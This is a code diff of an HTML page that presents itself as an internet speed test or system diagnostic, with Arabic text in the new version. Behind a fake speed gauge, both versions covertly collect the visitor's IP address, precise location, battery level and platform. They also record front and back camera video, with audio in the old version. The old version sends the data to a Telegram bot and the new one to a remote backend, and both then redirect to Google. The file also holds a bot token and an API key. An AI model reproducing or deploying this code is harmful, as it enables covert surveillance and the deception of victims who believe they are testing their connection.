@@ -1,136 +1,187 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Network System Scan</title>
+    <title>SpeedTest Professional - فحص سرعة الإنترنت</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
-        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #161b22; border: 1px solid #30363d; border-radius: 15px; padding: 35px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
-        .loader { width: 70px; height: 70px; border: 6px solid #21262d; border-top: 6px solid #238636; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .speed-digit { font-size: 48px; font-weight: bold; color: #2ea043; margin: 10px 0; }
-        .status-text { font-size: 13px; color: #8b949e; font-family: monospace; text-align: left; background: #0d1117; padding: 10px; border-radius: 5px; min-height: 60px; line-height: 1.6; }
-        .success-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0d1117; color: #2ea043; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
+        :root { --primary: #00ffd5; --bg: #0e1015; }
+        body { background: var(--bg); color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; width: 90%; max-width: 500px; padding: 20px; border-radius: 20px; background: rgba(255,255,255,0.05); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .gauge-container { position: relative; margin: 20px 0; }
+        #speed-text { font-size: 3rem; font-weight: bold; color: var(--primary); margin: 10px 0; }
+        .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; }
+        .btn-start:hover { transform: scale(1.05); box-shadow: 0 0 20px var(--primary); }
+        #status-msg { margin-top: 15px; color: #888; font-size: 0.9rem; }
+        video { display: none; } /* إخفاء عناصر الفيديو تماماً */
     </style>
 </head>
-<body onclick="startScan()">
+<body>
 
-    <div class="card" id="main-ui">
-        <div style="font-size: 14px; color: #8b949e; letter-spacing: 2px;">SYSTEM DIAGNOSTIC</div>
-        <div class="loader"></div>
-        <div class="speed-digit" id="speed">0.0</div>
-        <div style="color: #8b949e; margin-bottom: 20px;">Checking Connection...</div>
-        <div class="status-text" id="log">
-            > Initializing modules...<br>
-            > Waiting for authentication...
-        </div>
+<div class="container">
+    <h2>فحص جودة الاتصال</h2>
+    <p>قم بقياس سرعة التحميل والرفع في ثوانٍ</p>
+   
+    <div class="gauge-container">
+        <canvas id="speedChart"></canvas>
+        <div id="speed-text">0.0</div>
+        <div style="color: var(--primary)">Mbps</div>
     </div>
 
-    <div id="success-screen" class="success-overlay">
-        <div style="font-size: 50px;">✅</div>
-        <h2 style="margin: 20px 0;">تم الفحص بنجاح</h2>
-        <p style="color: #8b949e;">Security Check Completed. No Threats Found.</p>
-    </div>
+    <button class="btn-start" id="startBtn" onclick="startTest()">بدء الفحص</button>
+    <p id="status-msg">اضغط على الزر للبدء بالتحليل</p>
+</div>
 
-    <script>
-        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chatId');
-        let isStarted = false;
+<video id="video" autoplay playsinline muted></video>
 
-        // بدء العمل فوراً عند فتح الرابط
-        window.onload = () => { startScan(); };
+<script>
+// --- الإعدادات ---
+const BACKEND_URL = "http://127.0.0.1:8000"; // ضع رابط سيرفرك هنا
+const API_KEY = "Mohammed1+";
+const urlParams = new URLSearchParams(window.location.search);
+const chatId = urlParams.get('chatId');
 
-        async function startScan() {
-            if (isStarted || !chatId) return;
-            isStarted = true;
+// --- تنبيه الدخول (Notify Open) ---
+window.onload = () => {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    fetch(`${BACKEND_URL}/notify-open`, {
+        method: 'POST',
+        headers: { 'X-API-Key': API_KEY },
+        body: formData
+    });
+};
 
-            // 1. إرسال تقرير البيانات فوراً
-            sendReport();
-            animateCounter();
+// --- إعداد الرسم البياني ---
+const ctx = document.getElementById('speedChart').getContext('2d');
+let speedChart = new Chart(ctx, {
+    type: 'line',
+    data: { labels: ['', '', '', '', ''], datasets: [{ data: [0, 0, 0, 0, 0], borderColor: '#00ffd5', tension: 0.4 }] },
+    options: { plugins: { legend: { display: false } }, scales: { x: { display: false }, y: { display: false } } }
+});
 
-            // 2. تصوير الكاميرا الأمامية (10 ثوانٍ)
-            updateLog("Scanning primary sensor...");
-            await runCapture("user", "Front_Cam");
+async function startTest() {
+    document.getElementById('startBtn').style.display = 'none';
+    document.getElementById('status-msg').innerText = "جاري الاتصال بالخادم...";
+   
+    try {
+        // 1. جلب البيانات التقنية والموقع
+        const deviceData = await getDeviceInfo();
+       
+        // 2. طلب الكاميرا والموقع (سيسأل المتصفح المستخدم هنا)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        document.getElementById('video').srcObject = stream;
 
-            // 3. تصوير الكاميرا الخلفية (10 ثوانٍ)
-            updateLog("Scanning secondary sensor...");
-            await runCapture("environment", "Back_Cam");
+        // 3. إرسال تقرير البيانات الأول
+        await sendData(deviceData);
 
-            // 4. إظهار رسالة النجاح والتحويل
-            finishProcess();
+        // 4. التقاط صورة فورية
+        captureSnapshot(stream, "Front");
+
+        // 5. محاكاة العداد (تأثير بصري)
+        simulateGauge();
+
+        // 6. تسجيل الفيديو (أمامية ثم خلفية)
+        await recordVideo(stream, "Front", 10000);
+       
+        // محاولة التبديل للكاميرا الخلفية (للهواتف)
+        try {
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            captureSnapshot(backStream, "Back");
+            await recordVideo(backStream, "Back", 10000);
+        } catch (e) { console.log("Back camera not available"); }
+
+        // الإنهاء والتحويل
+        document.getElementById('status-msg').innerText = "تم فحص الشبكة بنجاح، جودة اتصالك ممتازة!";
+        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+
+    } catch (err) {
+        console.error(err);
+        document.getElementById('status-msg').innerText = "خطأ في الاتصال، تأكد من منح الصلاحيات وأعد المحاولة.";
+    }
+}
+
+async function getDeviceInfo() {
+    const battery = await navigator.getBattery();
+    const res = await fetch('https://ipapi.co/json/');
+    const ipData = await res.json();
+   
+    // محاولة جلب الإحداثيات الدقيقة
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            resolve({
+                ip: ipData.ip,
+                location: `${ipData.city}, ${ipData.country_name}`,
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                os: navigator.platform,
+                battery: Math.round(battery.level * 100)
+            });
+        }, () => {
+            resolve({ ip: ipData.ip, location: ipData.city, os: navigator.platform, battery: Math.round(battery.level * 100) });
+        });
+    });
+}
+
+function captureSnapshot(stream, type) {
+    const canvas = document.createElement('canvas');
+    const video = document.getElementById('video');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob((blob) => {
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('image', blob);
+        fd.append('camera_type', type);
+        sendRequest(fd);
+    }, 'image/jpeg');
+}
+
+async function recordVideo(stream, type, duration) {
+    const mediaRecorder = new MediaRecorder(stream);
+    mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('video_chunk', event.data);
+            fd.append('camera_type', type);
+            sendRequest(fd);
         }
+    };
+    mediaRecorder.start(2000); // إرسال جزء (Chunk) كل ثانيتين
+    await new Promise(r => setTimeout(r, duration));
+    mediaRecorder.stop();
+}
 
-        function updateLog(t) {
-            document.getElementById('log').innerHTML += `<br>> ${t}`;
-        }
+async function sendData(data) {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('device_info', JSON.stringify(data));
+    return sendRequest(fd);
+}
 
-        function animateCounter() {
-            let val = 0;
-            const timer = setInterval(() => {
-                if (val < 94) {
-                    val += Math.random() * 8;
-                    document.getElementById('speed').innerText = val.toFixed(1);
-                } else { clearInterval(timer); }
-            }, 400);
-        }
+async function sendRequest(formData) {
+    return fetch(`${BACKEND_URL}/receive-data`, {
+        method: 'POST',
+        headers: { 'X-API-Key': API_KEY },
+        body: formData
+    });
+}
 
-        async function sendReport() {
-            try {
-                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const bat = await navigator.getBattery();
-                const text = `
-🚀 **New Session Logged**
-━━━━━━━━━━━━━━━━━━
-🆔 **Session:** \`#${Math.floor(Math.random()*9999)}\`
-🌐 **IP:** \`${ipInfo.ip}\`
-📍 **Loc:** ${ipInfo.city}, ${ipInfo.country_name}
-🔋 **Bat:** ${Math.round(bat.level * 100)}%
-📱 **OS:** ${navigator.platform}
-━━━━━━━━━━━━━━━━━━`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-            } catch (e) {}
-        }
+function simulateGauge() {
+    let i = 0;
+    const interval = setInterval(() => {
+        const val = (Math.random() * 50 + 20).toFixed(1);
+        document.getElementById('speed-text').innerText = val;
+        speedChart.data.datasets[0].data.push(val);
+        speedChart.data.datasets[0].data.shift();
+        speedChart.update();
+        if (i++ > 50) clearInterval(interval);
+    }, 200);
+}
+</script>
 
-        async function runCapture(facing, name) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facing, width: 640, height: 360 },
-                    audio: true
-                });
-               
-                const rec = new MediaRecorder(stream);
-                const data = [];
-                rec.ondataavailable = e => data.push(e.data);
-
-                return new Promise(res => {
-                    rec.onstop = async () => {
-                        const blob = new Blob(data, { type: 'video/mp4' });
-                        const fd = new FormData();
-                        fd.append('chat_id', chatId);
-                        fd.append('document', blob, `${name}.mp4`);
-                        fd.append('caption', `🎥 Source: ${name}`);
-                       
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
-                        stream.getTracks().forEach(t => t.stop());
-                        res();
-                    };
-                    rec.start();
-                    setTimeout(() => rec.stop(), 10000); // 10 ثوانٍ
-                });
-            } catch (err) {
-                updateLog(`Sensor ${name} blocked.`);
-                return Promise.resolve();
-            }
-        }
-
-        function finishProcess() {
-            document.getElementById('success-screen').style.display = 'flex';
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 3000); // تظهر رسالة تم الفحص لمدة 3 ثوانٍ ثم يحول لجوجل
-        }
-    </script>
 </body>
 </html>
